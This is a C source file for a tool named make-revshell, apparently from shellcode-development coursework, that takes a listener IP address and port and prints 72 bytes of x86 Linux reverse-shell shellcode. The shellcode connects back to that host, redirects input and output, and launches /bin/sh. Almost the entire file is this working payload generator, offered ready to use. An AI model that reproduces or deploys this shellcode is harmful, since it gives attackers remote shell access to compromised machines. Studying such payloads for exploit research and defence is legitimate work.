/******************************************************************
*    make-revshell -- Program to generate reverse shellcode
* 
*    Author   : Re4son re4son [ at ] whitedome.com.au
*    Purpose  : generates reverse shell code with
*               IP address and port given as arguments
*    Usage    : make-revshell --LHOST=<IP address> --LPORT=<port>
******************************************************************/


#include <stdio.h>
#include <string.h>
#include <getopt.h>

int main( int argc, char *argv[] )
{
    unsigned int port, ip1,  ip2, ip3, ip4;
    unsigned char low,high;
    char cmdArg[6], *p;
    char c;
    int i;
    int option_index = 0;


    static const struct option longOpts[] = {
        {"LHOST", required_argument, NULL, 'i'},
        {"lhost", required_argument, NULL, 'i'},
        {"LPORT", required_argument, NULL, 'p'},
        {"lport", required_argument, NULL, 'p'},
        {NULL, 0, NULL, 0}
    };

    port = ip1 =  ip2 = ip3 = ip4 =0;

    while ((c = getopt_long( argc, argv, ":i:p:", longOpts, &option_index )) != -1 ) {
        switch (c) {
        case 'i':
	    p = strtok (optarg,".");
	    if (p)
	    	ip1 = atoi(p);
	    else {
		ip1 =  ip2 = ip3 = ip4 =0;
		break;
	    }
	    p = strtok (NULL,".");
	    if (p)
	    	ip2 = atoi(p);
	    else {
		ip1 =  ip2 = ip3 = ip4 =0;
		break;
	    }
	    p = strtok (NULL,".");
	    if (p)
	    	ip3 = atoi(p);
	    else {
		ip1 =  ip2 = ip3 = ip4 =0;
		break;
	    }
	    p = strtok (NULL,".");
	    if (p)
	    	ip4 = atoi(p);
	    else {
		ip1 =  ip2 = ip3 = ip4 =0;
		break;
	    }
            break;

        case 'p':
            strcpy(cmdArg, optarg);
            port = atoi(cmdArg);
            high = port >> 8;
            low = (port << 8) >> 8;
	    break;
	default:
	    printf( "\n\tUsage: %s --LHOST=<IP address> --LPORT=<port>\n"
	            "\t   or: %s -i <IP address> -p <port>\n\n", argv[0], argv[0] );
	    return -1;
        }
    }

    if (ip1 == 0 && ip2 == 0 && ip3 == 0 && ip4 == 0){
        printf( "\n\tInvalid IP address\n"
	        "\tUsage: %s --LHOST=<IP address> --LPORT=<port>\n\n", argv[0] );
	return -1;
    } else if (ip1 > 254 || ip2 > 254 || ip3 > 254 || ip4 > 254){
        printf( "\n\tInvalid IP address\n"
	        "\tUsage: %s --LHOST=<IP address> --LPORT=<port>\n\n", argv[0] );
	return -1;
    } else if (port < 1 || port > 65535){
        printf( "\n\tInvalid port number\n"
	        "\tUsage: %s --LHOST=<IP address> --LPORT=<port>\n\n", argv[0] );
	return -1;	
    } else {
	if (high == 0 || low == 0 || ip1 ==0 || ip2 == 0 || ip3 == 0 || ip4 == 0 ){
	    printf(  "\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"
	             "!!  CAUTION:  NULL characters detected  !!\n"
		     "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
	}   

        printf(  "\nShellcode length             : 72 bytes\n\n"
	         "IP Address (%03d.%03d.%03d.%03d) : \\x%02x\\x%02x\\x%02x\\x%02x\n"
	         "Bind port (%05d)            : \\x%02x\\x%02x\n\n"


	         "\"\\x99\\x52\\x42\\x52\\x89\\xd3\\x42\\x52\\x89\\xe1\"\n"
	         "\"\\x6a\\x66\\x58\\x89\\xc7\\xcd\\x80\\x97\\x68\\x%02x\"\n"
	         "\"\\x%02x\\x%02x\\x%02x\\x66\\x68\\x%02x\\x%02x\\x66\\x6a\\x02\"\n"
	         "\"\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xb3\\x03\"\n"
	         "\"\\xcd\\x80\\x5b\\x87\\xca\\xb0\\x3f\\xcd\\x80\\x49\"\n"
	         "\"\\x79\\xf9\\x99\\x89\\xd1\\x52\\x68\\x2f\\x2f\\x73\"\n"
	         "\"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\"\n"
	         "\"\\xcd\\x80\";\n\n", \
	         ip1, ip2, ip3, ip4, ip1, ip2, ip3, ip4, \
	         port, high, low, \
	         ip1, ip2, ip3, ip4, high, low);

        return 0;
    }
}
